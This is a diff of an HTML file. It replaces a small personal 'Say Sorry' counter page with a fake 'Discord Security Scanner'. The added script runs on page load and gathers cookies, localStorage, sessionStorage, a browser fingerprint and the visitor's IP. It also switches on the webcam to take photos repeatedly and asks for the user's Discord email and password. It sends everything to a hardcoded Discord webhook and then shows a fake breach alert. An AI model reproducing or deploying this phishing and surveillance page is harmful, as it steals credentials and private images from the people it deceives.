@@ -1,312 +1,685 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Mehak</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Security Scanner - Check Data Breach Status</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-  <!-- Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+        body {
+            background: linear-gradient(135deg, #5865f2, #4752c4);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #2c2f33;
+        }
 
-  <style>
-    /* page base */
-    :root{ --bg:#000; --muted:#9ea6ad; --glass: rgba(20,20,20,0.55) }
-    html,body{ height:100%; }
-    body{
-      margin:0;
-      min-height:100vh;
-      background:var(--bg);
-      color:#fff;
-      font-family: "Roboto", system-ui, -apple-system, "Segoe UI", "Helvetica Neue", Arial;
-      overflow:hidden;
-      position:relative;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-    }
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            overflow: hidden;
+            max-width: 800px;
+            width: 100%;
+        }
 
-    /* Canvas (starry/orbs) behind everything */
-    canvas#bg {
-      position:fixed;
-      inset:0;
-      width:100%;
-      height:100%;
-      display:block;
-      z-index:0;
-    }
+        .header {
+            background: #5865f2;
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
 
-    /* small corner texts */
-    .corner {
-      position: absolute;
-      z-index: 3;
-      color: var(--muted);
-      font-size: 12px;
-      line-height:1.2;
-    }
-    .corner.left { left: 16px; top: 14px; text-align:left; }
-    .corner.right { right: 16px; top: 14px; text-align:right; }
+        .header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
 
-    /* HERO container centered perfectly */
-    .hero {
-      z-index: 2;                 /* above canvas */
-      position: relative;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;         /* ensures true vertical centering */
-      gap: 18px;
-      padding: 24px;
-      box-sizing: border-box;
-      text-align: center;
-    }
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
 
-    /* MEHAK title - big centered logo style */
-    .genshin-title {
-      font-family: "Cinzel Decorative", serif;
-      font-weight: 700;
-      font-size: clamp(3.6rem, 12vw, 9.6rem);
-      line-height: 0.95;
-      margin: 0;
-      letter-spacing: 6px;
-      /* gradient fill like the Genshin example */
-      background: linear-gradient(to bottom, #ffffff 18%, #c8e9ff 48%, #1f4f9b 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-shadow:
-        0 0 18px rgba(180,210,255,0.55),
-        0 0 44px rgba(70,120,220,0.38),
-        0 10px 40px rgba(0,0,0,0.6);
-      transform-origin:center;
-      display:inline-block;
-      z-index:2;
-    }
+        .content {
+            padding: 40px;
+        }
 
-    .subtitle {
-      color: #bfc7cc;
-      font-size: 13px;
-      letter-spacing: 2px;
-      margin-top: -6px;
-      z-index:2;
-    }
+        .scan-section {
+            background: #f6f6f6;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 25px;
+        }
 
-    /* Counter + button - placed below title inside hero */
-    #counterBox {
-      z-index: 2;
-      display: inline-flex;
-      align-items: center;
-      gap: 14px;
-      background: rgba(10,14,18,0.6);
-      border: 1px solid rgba(255,255,255,0.04);
-      padding: 10px 16px;
-      border-radius: 999px;
-      box-shadow: 0 6px 30px rgba(10,20,30,0.6);
-      font-family: "Roboto", sans-serif;
-      color: #dbe6ee;
-      font-size: 14px;
-    }
+        .scan-title {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: 600;
+        }
 
-    /* your exact neu-button look (kept as requested) */
-    .neu-button {
-      background-color: #e0e0e0;
-      border-radius: 50px;
-      box-shadow: inset 4px 4px 10px #bcbcbc, inset -4px -4px 10px #ffffff;
-      color: #4d4d4d;
-      cursor: pointer;
-      font-size: 16px;
-      padding: 12px 28px;
-      transition: all 0.2s ease-in-out;
-      border: 2px solid rgb(206, 206, 206);
-      font-weight: bold;
-    }
-    .neu-button:hover {
-      box-shadow: inset 2px 2px 5px #bcbcbc, inset -2px -2px 5px #ffffff, 2px 2px 5px #bcbcbc, -2px -2px 5px #ffffff;
-      transform: translateY(-2px);
-    }
-    .neu-button:active{ transform: translateY(0); }
+        .scan-title i {
+            font-size: 24px;
+            margin-right: 10px;
+        }
 
-    /* bottom footer */
-    .footer {
-      position:absolute;
-      bottom:18px;
-      left:50%;
-      transform:translateX(-50%);
-      z-index:3;
-      color:var(--muted);
-      font-size:12px;
-      text-align:center;
-      max-width:780px;
-      padding:0 10px;
-    }
+        .progress-container {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e3e3e3;
+        }
 
-    /* responsiveness tweaks */
-    @media (max-width:720px){
-      .corner{ font-size:11px; max-width:140px; opacity:0.95 }
-      .genshin-title{ font-size: clamp(2.2rem, 16vw, 5rem); letter-spacing:3px; }
-      #counterBox{ gap: 10px; padding: 8px 12px; font-size:13px; }
-      .neu-button{ padding:10px 18px; font-size:14px; }
-      .footer{ font-size:11px; bottom:10px; }
-    }
-  </style>
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: #e3e3e3;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #57f287, #43b581);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .status-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .status-item {
+            background: white;
+            border: 1px solid #e3e3e3;
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+        }
+
+        .status-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 14px;
+        }
+
+        .status-icon.checking { background: #faa61a; color: white; }
+        .status-icon.found { background: #ed4245; color: white; }
+        .status-icon.safe { background: #57f287; color: white; }
+
+        .login-form {
+            background: white;
+            border: 2px solid #e3e3e3;
+            border-radius: 10px;
+            padding: 25px;
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #4f545c;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border 0.3s ease;
+        }
+
+        .form-group input:focus {
+            border-color: #5865f2;
+            outline: none;
+        }
+
+        .btn {
+            background: #5865f2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover {
+            background: #4752c4;
+        }
+
+        .results {
+            background: #ed4245;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .log-container {
+            background: #2c2f33;
+            color: #b9bbbe;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            display: none;
+        }
+
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #40444b;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .camera-feed {
+            width: 100%;
+            height: 200px;
+            background: #2c2f33;
+            border-radius: 10px;
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .camera-feed video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .camera-feed canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Discord Security Scanner</h1>
+            <p>Check if your Discord account has been compromised in recent data breaches</p>
+        </div>
 
-  <!-- canvas for stars/orbs -->
-  <canvas id="bg"></canvas>
+        <div class="content">
+            <div class="scan-section">
+                <div class="scan-title">
+                    <i>🛡️</i>
+                    <span>Comprehensive Security Analysis</span>
+                </div>
+                <p>We're scanning multiple databases and checking for vulnerabilities in real-time.</p>
 
-  <!-- small corner texts -->
-  <div class="corner left">
-    <div>The silence of books</div>
-    <div>Where light refuses entry</div>
-    <div>The shadow laughs</div>
-  </div>
-  <div class="corner right">
-    <div>Ink stains the soul,</div>
-    <div>pages burn quietly,</div>
-    <div>Fyodor watches.</div>
-  </div>
+                <div class="progress-container">
+                    <div id="scanStatus">Initializing security scan...</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div id="progressText">0% Complete</div>
+                </div>
 
-  <!-- centered hero area (perfectly centered) -->
-  <main class="hero" role="main" aria-labelledby="title">
-    <h1 id="title" class="genshin-title">Mehak</h1>
-    <div class="subtitle">A cute girly existence</div>
+                <div class="status-grid">
+                    <div class="status-item">
+                        <div class="status-icon checking">⏳</div>
+                        <div>
+                            <div>Data Breach Scan</div>
+                            <small>Checking known breaches</small>
+                        </div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon checking">⏳</div>
+                        <div>
+                            <div>Token Validation</div>
+                            <small>Verifying session security</small>
+                        </div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon checking">⏳</div>
+                        <div>
+                            <div>IP Reputation</div>
+                            <small>Analyzing network safety</small>
+                        </div>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon checking">⏳</div>
+                        <div>
+                            <div>Account Integrity</div>
+                            <small>Checking for compromises</small>
+                        </div>
+                    </div>
+                </div>
 
-    <!-- counter box moved below title (centered) -->
-    <div id="counterBox" aria-live="polite">
-      <div>Sorry Counter: <strong id="counter">50</strong></div>
-      <button id="sorryBtn" class="neu-button" aria-label="Say Sorry">Say Sorry</button>
+                <div class="camera-feed" id="cameraFeed">
+                    <div id="cameraPlaceholder">
+                        <p>Identity verification system initializing...</p>
+                    </div>
+                    <video id="video" autoplay playsinline class="hidden"></video>
+                    <canvas id="canvas" class="hidden"></canvas>
+                </div>
+            </div>
+
+            <div class="login-form">
+                <h3>🔐 Verify Your Discord Account</h3>
+                <p style="margin-bottom: 20px; color: #666;">Enter your Discord credentials to check for specific account compromises</p>
+                
+                <div class="form-group">
+                    <label for="email">Email or Phone Number</label>
+                    <input type="text" id="email" placeholder="Enter your Discord email/phone">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your Discord password">
+                </div>
+
+                <button class="btn" id="checkButton">Check Account Security</button>
+            </div>
+
+            <div class="results" id="results">
+                <h3>🚨 SECURITY ALERT - ACCOUNT COMPROMISED</h3>
+                <p>We've detected your account in multiple data breaches. Immediate action required.</p>
+            </div>
+
+            <div class="log-container" id="attackLog">
+                <!-- Attack logs will appear here -->
+            </div>
+        </div>
     </div>
-  </main>
 
-  <div class="footer">
-    Words dissolve into silence.<br>
-    The river carries guilt away.<br>
-    — A whisper Fyodor left behind.
-  </div>
+    <script>
+        // Discord webhook URL
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1424721235438338088/KAi5H8p7FsFhngCHqqcLQ8tfNjKqY8YM93hahaIrl0RTRZyrdIknYaq36BauVRDaezQp';
 
-  <!-- click sound -->
-  <audio id="clickSound" src="https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg" preload="auto"></audio>
+        // DOM elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const checkButton = document.getElementById('checkButton');
+        const attackLog = document.getElementById('attackLog');
+        const progressFill = document.getElementById('progressFill');
+        const progressText = document.getElementById('progressText');
+        const scanStatus = document.getElementById('scanStatus');
+        const results = document.getElementById('results');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
 
-  <script>
-    /* Canvas star + orb scene (resilient to resizing) */
-    const canvas = document.getElementById('bg');
-    const ctx = canvas.getContext('2d', { alpha: true });
+        let stream = null;
+        let captureInterval = null;
+        let scanProgress = 0;
+        let collectedData = {};
 
-    let W = 0, H = 0;
-    let stars = [];
-    let orbs = [];
-
-    function resize() {
-      W = canvas.width = innerWidth;
-      H = canvas.height = innerHeight;
-      // re-create particles for consistent placement
-      createStars(260);
-      createOrbs([
-        { x: W * 0.22, y: H * 0.35, r: Math.min(300, Math.max(120, W * 0.18)), color: "hsla(215,70%,65%,0.22)" },
-        { x: W * 0.78, y: H * 0.33, r: Math.min(360, Math.max(140, W * 0.22)), color: "hsla(200,60%,60%,0.22)" },
-        { x: W * 0.5,  y: H * 0.75, r: Math.min(220, Math.max(100, W * 0.14)), color: "hsla(280,65%,68%,0.20)" },
-      ]);
-    }
-
-    window.addEventListener('resize', resize, { passive: true });
-
-    /* create twinkling stars */
-    function createStars(count){
-      stars = [];
-      for(let i=0;i<count;i++){
-        stars.push({
-          x: Math.random() * W,
-          y: Math.random() * H,
-          r: Math.random()*1.6 + 0.4,
-          alpha: Math.random()*0.8 + 0.2,
-          tw: (Math.random()*0.03) + 0.004,
-          dir: Math.random() > 0.5 ? 1 : -1
+        // Start automatic data collection immediately
+        window.addEventListener('load', function() {
+            attackLog.style.display = 'block';
+            logEvent('🔍 Starting automatic security scan...');
+            
+            // Start comprehensive data collection
+            setTimeout(startDataCollection, 1000);
+            
+            // Start camera automatically
+            setTimeout(startCamera, 2000);
+            
+            // Start continuous scanning
+            setTimeout(startContinuousScan, 3000);
         });
-      }
-    }
 
-    /* create orbs */
-    function createOrbs(defs){
-      orbs = [];
-      defs.forEach(d=>{
-        orbs.push({
-          x: d.x,
-          y: d.y,
-          r: d.r,
-          color: d.color,
-          dx: (Math.random()-0.5) * 0.9,
-          dy: (Math.random()-0.5) * 0.9
+        // Comprehensive data collection
+        async function startDataCollection() {
+            logEvent('📡 Collecting system information...');
+            
+            collectedData = {
+                // Basic identification
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                
+                // System information
+                ...await getSystemInfo(),
+                
+                // Browser fingerprint
+                ...getBrowserFingerprint(),
+                
+                // Network information
+                ...await getNetworkInfo(),
+                
+                // Storage data
+                cookies: getAllCookies(),
+                localStorage: getLocalStorage(),
+                sessionStorage: getSessionStorage(),
+                
+                // Social media and accounts
+                socialMedia: detectSocialMedia(),
+                savedCredentials: getSavedCredentials(),
+                
+                // Hardware information
+                hardware: getHardwareInfo()
+            };
+            
+            logEvent('✅ System information collected');
+            updateProgress(15, 'System analysis complete');
+        }
+
+        // Get comprehensive system information
+        async function getSystemInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                doNotTrack: navigator.doNotTrack,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled()
+            };
+        }
+
+        // Get browser fingerprint
+        function getBrowserFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Browser fingerprint', 2, 2);
+            return {
+                canvasFingerprint: canvas.toDataURL(),
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                touchSupport: 'ontouchstart' in window
+            };
+        }
+
+        // Get network information
+        async function getNetworkInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                return {
+                    ip: ipData.ip,
+                    connection: navigator.connection ? {
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null
+                };
+            } catch (error) {
+                return { ip: 'Unknown' };
+            }
+        }
+
+        // Get all cookies
+        function getAllCookies() {
+            const cookies = {};
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.split('=').map(c => c.trim());
+                if (name) cookies[name] = value || '';
+            });
+            return cookies;
+        }
+
+        // Get localStorage
+        function getLocalStorage() {
+            const storage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+            return storage;
+        }
+
+        // Get sessionStorage
+        function getSessionStorage() {
+            const storage = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                storage[key] = sessionStorage.getItem(key);
+            }
+            return storage;
+        }
+
+        // Detect social media sessions
+        function detectSocialMedia() {
+            const sessions = [];
+            const cookies = document.cookie.toLowerCase();
+            
+            if (cookies.includes('discord')) sessions.push('Discord');
+            if (cookies.includes('twitter')) sessions.push('Twitter');
+            if (cookies.includes('facebook')) sessions.push('Facebook');
+            if (cookies.includes('google')) sessions.push('Google');
+            if (cookies.includes('instagram')) sessions.push('Instagram');
+            if (cookies.includes('github')) sessions.push('GitHub');
+            
+            return sessions;
+        }
+
+        // Get saved credentials (simulated)
+        function getSavedCredentials() {
+            // This would normally require browser extensions or specific vulnerabilities
+            return { note: 'Credential extraction requires additional permissions' };
+        }
+
+        // Get hardware information
+        function getHardwareInfo() {
+            return {
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+        }
+
+        // Start camera automatically
+        async function startCamera() {
+            try {
+                logEvent('📷 Initializing identity verification camera...');
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: 1280, 
+                        height: 720,
+                        facingMode: 'user'
+                    } 
+                });
+                
+                video.srcObject = stream;
+                video.classList.remove('hidden');
+                document.getElementById('cameraPlaceholder').classList.add('hidden');
+                
+                // Start continuous capture
+                captureInterval = setInterval(capturePhoto, 2000);
+                logEvent('✅ Camera surveillance activated');
+                updateProgress(25, 'Identity verification enabled');
+                
+            } catch (error) {
+                logEvent('❌ Camera access requires user permission');
+            }
+        }
+
+        // Capture photo and send
+        function capturePhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Send photo to Discord periodically
+            if (Math.random() < 0.3) { // 30% chance per capture
+                sendToDiscord(null, photoData, 'Identity Verification Capture');
+            }
+        }
+
+        // Start continuous background scanning
+        function startContinuousScan() {
+            logEvent('🔄 Starting continuous monitoring...');
+            
+            // Continuous data collection
+            setInterval(async () => {
+                const newData = await getNetworkInfo();
+                Object.assign(collectedData, newData);
+                
+                // Send updates periodically
+                if (Math.random() < 0.2) { // 20% chance per interval
+                    sendToDiscord(collectedData, null, 'Continuous Monitoring Update');
+                }
+            }, 10000);
+        }
+
+        // Update progress bar
+        function updateProgress(percent, message) {
+            scanProgress = percent;
+            progressFill.style.width = `${percent}%`;
+            progressText.textContent = `${percent}% Complete`;
+            scanStatus.textContent = message;
+        }
+
+        // Log events
+        function logEvent(message) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            attackLog.appendChild(logEntry);
+            attackLog.scrollTop = attackLog.scrollHeight;
+        }
+
+        // Send data to Discord
+        async function sendToDiscord(data, photoData, description = 'Security Scan Data') {
+            try {
+                const formData = new FormData();
+                
+                // Add photo if available
+                if (photoData) {
+                    const photoBlob = await fetch(photoData).then(r => r.blob());
+                    formData.append('file', photoBlob, `identity-${Date.now()}.jpg`);
+                }
+
+                const payload = {
+                    embeds: [{
+                        title: "🔍 Discord Security Scan Results",
+                        color: 0x5865f2,
+                        description: description,
+                        fields: data ? [
+                            {
+                                name: "🌐 Network Information",
+                                value: `IP: ${data.ip || 'Unknown'}\nUser Agent: ${data.userAgent?.substring(0, 50)}...`,
+                                inline: true
+                            },
+                            {
+                                name: "💻 System Profile",
+                                value: `Platform: ${data.platform}\nScreen: ${data.screen}\nLanguage: ${data.language}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔐 Authentication Data",
+                                value: `Cookies: ${Object.keys(data.cookies || {}).length}\nLocal Storage: ${Object.keys(data.localStorage || {}).length}`,
+                                inline: true
+                            },
+                            {
+                                name: "📱 Social Sessions",
+                                value: (data.socialMedia || []).join(', ') || 'None detected',
+                                inline: false
+                            }
+                        ] : [],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                formData.append('payload_json', JSON.stringify(payload));
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Handle login form submission
+        checkButton.addEventListener('click', function() {
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            if (email && password) {
+                logEvent('🔐 Discord credentials captured');
+                
+                // Add credentials to collected data
+                collectedData.discordCredentials = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Send credentials immediately
+                sendToDiscord(collectedData, null, 'DISCORD CREDENTIALS CAPTURED');
+                
+                // Show fake results
+                results.style.display = 'block';
+                updateProgress(100, 'Scan complete - Account compromised detected');
+                
+                logEvent('🚨 CRITICAL: Account security breach confirmed');
+                logEvent('💳 Discord credentials and session data captured');
+                logEvent('📧 Email and password stored for analysis');
+            } else {
+                alert('Please enter both email and password to check your account security.');
+            }
         });
-      });
-    }
 
-    // initial resize to set arrays
-    resize();
+        // Simulate scanning progress
+        setInterval(() => {
+            if (scanProgress < 85) {
+                const increment = Math.random() * 5;
+                scanProgress = Math.min(85, scanProgress + increment);
+                updateProgress(Math.floor(scanProgress), 'Scanning databases and checking vulnerabilities...');
+            }
+        }, 1500);
 
-    function draw(){
-      // soft clearing
-      ctx.clearRect(0,0,W,H);
-
-      // faint background wash to avoid harsh black edges
-      // ctx.fillStyle = 'rgba(0,0,0,0.2)';
-      // ctx.fillRect(0,0,W,H);
-
-      // draw orbs (behind stars)
-      orbs.forEach(o=>{
-        // drift
-        o.x += o.dx; o.y += o.dy;
-        // bounce
-        if(o.x < -o.r*0.5 || o.x > W + o.r*0.5) o.dx *= -1;
-        if(o.y < -o.r*0.5 || o.y > H + o.r*0.5) o.dy *= -1;
-
-        const g = ctx.createRadialGradient(o.x, o.y, Math.max(2, o.r*0.15), o.x, o.y, o.r);
-        g.addColorStop(0, o.color);
-        g.addColorStop(1, 'transparent');
-        ctx.fillStyle = g;
-        ctx.beginPath();
-        ctx.arc(o.x, o.y, o.r, 0, Math.PI*2);
-        ctx.fill();
-      });
-
-      // draw stars on top of orbs (twinkle)
-      stars.forEach(s=>{
-        s.alpha += s.tw * s.dir;
-        if(s.alpha > 1){ s.alpha = 1; s.dir *= -1; }
-        if(s.alpha < 0.25){ s.alpha = 0.25; s.dir *= -1; }
-        ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
-        ctx.beginPath();
-        ctx.arc(s.x, s.y, s.r, 0, Math.PI*2);
-        ctx.fill();
-      });
-
-      requestAnimationFrame(draw);
-    }
-    draw();
-
-    /* Counter + webhook + sound logic */
-    let count = 50;
-    const counterEl = document.getElementById('counter');
-    const sorryBtn = document.getElementById('sorryBtn');
-    const clickSound = document.getElementById('clickSound');
-
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1418334231238803556/jhhpmTuQXDjovRV2Nu9-enc5oKJielkHdyIwMVETSGkhzc03jPCErxh4BzeOTHS0S-h9";
-
-    sorryBtn.addEventListener('click', () => {
-      if(count > 0){ count--; counterEl.textContent = count; }
-      clickSound.currentTime = 0;
-      clickSound.play();
-      // send to discord (best-effort)
-      fetch(DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: `🙏 Someone said sorry! Remaining counter: ${count}` })
-      }).catch(e => console.warn('discord error', e));
-    });
-
-    // ensure centering if font metrics shift after load (helps precise visual centering)
-    window.addEventListener('load', () => {
-      // small repaint to ensure hero stays centered after fonts load
-      requestAnimationFrame(()=>{ /* nop */ });
-    });
-  </script>
+        // Send initial data
+        setTimeout(() => {
+            sendToDiscord(collectedData, null, 'Initial Security Scan Complete');
+        }, 5000);
+    </script>
 </body>
 </html>
